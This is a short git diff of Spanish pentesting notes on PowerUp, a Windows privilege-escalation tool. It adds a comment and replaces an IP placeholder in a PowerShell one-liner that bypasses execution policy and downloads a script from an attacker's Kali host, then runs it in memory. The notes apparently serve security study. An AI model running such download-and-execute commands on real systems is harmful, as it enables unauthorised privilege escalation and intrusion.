@@ -22,7 +22,8 @@ Tags: #Windows #Powershell #PowerUp #PrivEsc #Enumeracion #Servicios #PostExplot
 
 ```powershell
 # Cargar en memoria  <- MEJOR OPCIÓN 
-❯ powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://<IP_KALI>/PowerUp.ps1');Invoke-AllChecks > power.log 
+# Se ejecuta desde un CMD ya que se ejecuta una sesión Powershell 
+❯ powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.211/PowerUp.ps1');Invoke-AllChecks > power.log 
 
 
 # Cargar en disco 
